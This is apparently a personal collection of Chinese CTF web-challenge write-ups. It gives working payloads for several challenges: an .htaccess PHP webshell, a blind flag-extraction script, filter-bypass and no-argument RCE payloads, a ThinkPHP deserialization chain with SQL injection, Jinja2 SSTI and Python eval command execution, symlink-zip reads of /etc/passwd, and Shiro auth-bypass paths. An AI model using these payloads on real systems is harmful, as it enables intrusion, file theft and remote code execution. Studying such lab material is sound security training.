
### [SUCTF 2018]Homework
注册一个账户后登录
```php
<?php 
class calc{
	function __construct__(){
		calc();
	}

	function calc($args1,$method,$args2){
		$args1=intval($args1);
		$args2=intval($args2);
		switch ($method) {
			case 'a':
				$method="+";
				break;

			case 'b':
				$method="-";
				break;

			case 'c':
				$method="*";
				break;

			case 'd':
				$method="/";
				break;
			
			default:
				die("invalid input");
		}
		$Expression=$args1.$method.$args2;
		eval("\$r=$Expression;");
		die("Calculation results:".$r);
	}
}
?>
```

注意到url `http://d368b0ad-1d28-45b2-b7b8-cd228a86e969.node4.buuoj.cn:81/show.php?module=calc&args[]=2&args[]=a&args[]=2`

尝试读取文件,但是无回显
`/show.php?module=SplFileObject&args[]=/var/www/html/index.php`






### shiro权限绕过cheat

```
<1.5.3
/;/login
<1.7.1
/admin/%20
或者%08、%09、%0a
```

## [BSidesCF 2019]Mixer

好难，直接看wp，发现用了密码学的知识   

* CBC分组加密

> 这题考点在于CBC的整块替换。比如此处
> 加密的数据应该是`{"first_name":"A1.00000000000000","last_name":"1231","is_admin":0}`
> 前提知识：CBC是以16字节为一个块。然后进行加密

然后替换

`{"first_name":"A1.00000000000000","last_name":"1231","is_admin":0}` 提取cookie里的值并替换

## [JMCTF 2021]UploadHub

没有过滤后缀，但是上传php文件不会被解析

* 上传.htaccess文件

```xml-dtd
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#<?php eval($_POST['dmind']);?>

```

> nu1l  使用.htaccess文件上传盲注
>
> ```py
> import requests
> import string
> import hashlib
> ip = '74310c5695d734e667dc2250a05dcd29'//修改成自己的
> print(ip)
> 
> #当访问一个不存在的目录时,返回wpco6
> def check(a):
>     htaccess = '''
>     <If "file('/flag')=~ /'''+a+'''/">
>     ErrorDocument 404 "wupco6"
>     </If>
>     '''
>     resp = requests.post("http://ec19713a-672c-4509-bc22-545487f35622.node3.buuoj.cn/index.php?id=69660",data={'submit': 'submit'}, files={'file': ('.htaccess',htaccess)} )
>     a = requests.get("http://ec19713a-672c-4509-bc22-545487f35622.node3.buuoj.cn/upload/"+ip+"/a").text
> 
>     if "wupco" not in a:
>         return False
>     else:
>         print(a)
>         return True
> flag = "flag{"
> check(flag)
> 
> c = string.ascii_letters + string.digits + "\{\}"
> for j in range(32):
>     for i in c:
>         print("checking: "+ flag+i)
>         if check(flag+i):
>             flag = flag+i
>             print(flag)
>             break
>         else:
>             continue
> ```

## [FBCTF2019]Products Manager

* sql约束攻击

插入截断

> 当插入的字段超过设置的长度时，会截断后面
>
> ```
> varchar(64)
> flag +' '*61
> 只会插入 flag+''*60
> ```

查询去空

> 当查询的字段后面有空格时，查询的结果不变
>
> ```
> select * from table where name='name'
> select * from table where name='name '
> ```
>
> 输出相同

```php
function handle_post() {
  global $_POST;

  $name = $_POST["name"];
  $secret = $_POST["secret"];

  if (isset($name) && $name !== ""
        && isset($secret) && $secret !== "") {
    if (check_name_secret($name, hash('sha256', $secret)) === false) {
      return "Incorrect name or secret, please try again";
    }

    $product = get_product($name);
//唯一的输出点
    echo "<p>Product details:";
    echo "<ul><li>" . htmlentities($product['name']) . "</li>";
    echo "<li>" . htmlentities($product['description']) . "</li></ul></p>";
  }

  return null;
}
```

所以只需要让 `check_name_secret` 条件为真即可，而且输出的时候只判断的name的值

```php
function check_name_secret($name, $secret) {
  global $db;
  $valid = false;
  $statement = $db->prepare(
    "SELECT name FROM products WHERE name = ? AND secret = ?"
  );
  check_errors($statement);
  $statement->bind_param("ss", $name, $secret);
  check_errors($statement->execute());
  $res = $statement->get_result();
  check_errors($res);
  if ($res->fetch_assoc() !== null) {
    $valid = true;
  }
  $statement->close();
  return $valid;
}
```

而这个函数为真的条件很简单，就是当表里存在这个用户并且匹配secret

综上 payload

```
name=facebook+''*64+11
&secret=a
&description=666
```

## [HCTF 2018]Hideandseek

* flask session 伪造

随便一个用户就可以直接登录，存在文件上传，仅限zip文件

猜测软连接，构造

```
ln -s /etc/passwd passwd
zip -y passwd.zip passwd
```

任意文件读取

读取 `/proc/self/environ`

获取环境变量信息，发现使用了 uWSGI服务器,读取配置文件 `/app/uwsgi.ini`

回显main.py

```
app.config['SECRET_KEY'] = str(random.random()*100)
```

SECRET_KEY是随机数,而随机数的产生与种子有关,只要种子相同,那么随机数也相同

```
random.seed(uuid.getnode())
```

uuid.getnode() 负责获取硬件地址并以48位二进制长度正整数返回,而硬件地址在 `/sys/class/net/eth0/address`

```py
import uuid
import random

mac = "66:8a:85:33:79:51"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
print(mac)#将mac转为十进制

random.seed(mac)
print(random.random()*100)#由转化后的mac得到伪随机数种子


```

获得后flask_session加密即可

## [WMCTF2020]Web Check in 2.0

* php死亡绕过，过滤了很多关键词，到是搜到的过滤器直接可以绕过去

```
content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=shell.php
```

## [红明谷CTF 2021]EasyTP

* thinkphp v3.2.* 反序列化漏洞

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => true,
            "database" => "test", // 可换成任一存在的库
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root" // BUU环境密码为root
        );
    }
}
namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;
        public function __construct(){
            $this->img = new Memcache();
        }
    }
}
namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;
        public function __construct(){
            $this->handle = new Model();
        }
    }
}
namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options = array();
        protected $pk;
        protected $data = array();
        protected $db = null;
        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                //查看数据库名称
                // "table" => "mysql.user where updatexml(1,concat(0x7e,mid((select(group_concat(schema_name))from(information_schema.schemata)),30),0x7e),1)#",
                //数据库名称：'~information_schema,mysql,performance_schema,sys,test~'
                //一次能够读取的长度有限，分两次读取数据  使用mid函数分开读取

                //查表名
                // "table" => "mysql.user where updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#",
                // ~flag,users~

                // 查列名
                //"table" => "mysql.user where updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1)#",
                //~flag~

                //查字段值
                "table" => "mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),1),0x7e),1)#",
                "where" => "1=1"
                
            );
        }
    }
}
namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}


```

## [极客大挑战 2020]Roamphp4-Rceme

存在提示

<!-- Do you know vim swp? -->

> swp文件是vim编辑器的临时文件，用于保存因为意外中断而未保存的文件内容



> vim的swp文件默认保存在用户家目录下的".vim"文件夹中，文件名的格式为".[filename].swp"，其中[filename]为未保存的文件名。例如，如果未保存的文件名为"example.txt"，则对应的swp文件名为".example.txt.swp"

加载了一张图片

扫描显示

```
EGG{a_6ea4t1441_e99_in_QR_c0de}
```

执行命令需要验证码

```py
import hashlib

for i in range(1, 1000001):
    md5 = hashlib.md5(str(i).encode()).hexdigest()
    if md5.startswith('171b3'):
        print(i)
```

使用脚本暴力破解

但是提示  `Longlone not like you~`

那就可以读取源码了    访问 `/index.php.swp`

使用vim恢复

```shell
vim -r <filename>
```

好像没什么作用

去linux 下恢复

```php
<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['code'])){
    $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);
}
 
if(isset($_POST['cmd']) and isset($_POST['code'])){
 
    if(substr(md5($_POST['code']),0,5) !== $_SESSION['code']){
        die('<script>alert(\'Captcha error~\');history.back()</script>');
    }
    $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);
    $code = $_POST['cmd'];
    if(strlen($code) > 70 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/ixm',$code)){
        die('<script>alert(\'Longlone not like you~\');history.back()</script>');
    }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
        @eval($code);
        die();
    }
}
?>
```

eval 要求

* 代码长度 <70
* 无字母数字及各种符号，可用 ` ~   `
* 无参数函数

payload

```
# var_dump(next(getallheaders()))
cmd=[~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));&code=0a8bf6eca3449743
```

在请求里注入命令

* `[~(异或)][!%FF]`的形式组成字符串,然后无参数RCE

## 愚人杯2023

### easy_signin

签到，任意文件读取，读取index.php

### easy_ssti

app.zip 下载源码

```py
@app.route('/hello/')
def hello(name=None):
    return render_template('hello.html',name=name)
@app.route('/hello/<name>')
def hellodear(name):
    if "ge" in name:
        return render_template_string('hello %s' % name)
    elif "f" not in name:
        return render_template_string('hello %s' % name)
    else:
        return 'Nonononon'
```

`/hello/{{7*7}}`

过滤了 ` / f eg`

使用 `cd ..` 绕过

```py
/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('cd ..;ls').read()}}

/hello/{{g.pop.__globals__.__builtins__['__import__']('os').popen('cd ..;cat *g').read()}}
```

被遗忘的反序列化

```php
<?php

# 当前目录中有一个txt文件哦
// error_reporting(0);
// show_source(__FILE__);
include("check.php");

class EeE{
    public $text;
    public $eeee;
    public function __wakeup(){
        if ($this->text == "aaaa"){
            echo lcfirst($this->text);
        }
    }

    public function __get($kk){
        echo "$kk,eeeeeeeeeeeee";
    }

    public function __clone(){
        $a = new cycycycy;
        $a -> aaa();
    }
    
}

class cycycycy{
    public $a;
    private $b;

    public function aaa(){
        $get = $_GET['get'];
        $get = cipher($get);
        if($get === "p8vfuv8g8v8py"){
            eval($_POST["eval"]);
        }
    }


    public function __invoke(){
        $a_a = $this -> a;
        echo "\$a_a\$";
    }
}

class gBoBg{
    public $name;
    public $file;
    public $coos;
    private $eeee="-_-";
    public function __toString(){
        if(isset($this->name)){
            $a = new $this->coos($this->file);
            echo $a;
        }else if(!isset($this -> file)){
            return $this->coos->name;
        }else{
            $aa = $this->coos;
            $bb = $this->file;
            return $aa();
        }
    }
}   

class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
    public function __wakeup(){
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
            $this->key = file_get_contents($this -> file);
        }else{
            echo "不行哦";
        }
    }

    public function __destruct(){
        echo $this->aaa;
    }

    public function __invoke(){
        $this -> aaa = clone new EeE;
    }
}


$_ip = $_SERVER["HTTP_AAAAAA"];
unserialize($_ip);
echo($_ip);

//eval pop:EeE->__wakeup()=>aBoBg->__toString()=>w_wuw_w->__invoke()=>EeE->__clone()=>cycycycy->aaa()->eval()

//file_get_contents('check.php'):

```

思路:读取check.php 获取cipher函数，然后执行eval()

但是找了半天找不到 file_get_contents() 输出的机会

### easy_flask

flask session 伪造admin，key在示例里

伪造后可以下载 fake_flag,存在任意文件下载，下载 app.py

```py
@app.route('/hello/')
def hello_world():
    try:
        s = request.args.get('eval')
        return f"hello,{eval(s)}"
    except Exception as e:
        print(e)
        pass
        
    return "hello"
```

在 `hello` 下存在rce 

payload

```py
/hello?eval=__import__('os').system('ls')
```

但是回显为0，采用别的方式读取根目录

```py
/hello?eval=__import__('os').listdir('/')
```

得到 flag 文件名为 `flag_is_h3re`

过滤了 `print`

任意文件下载得到 flag



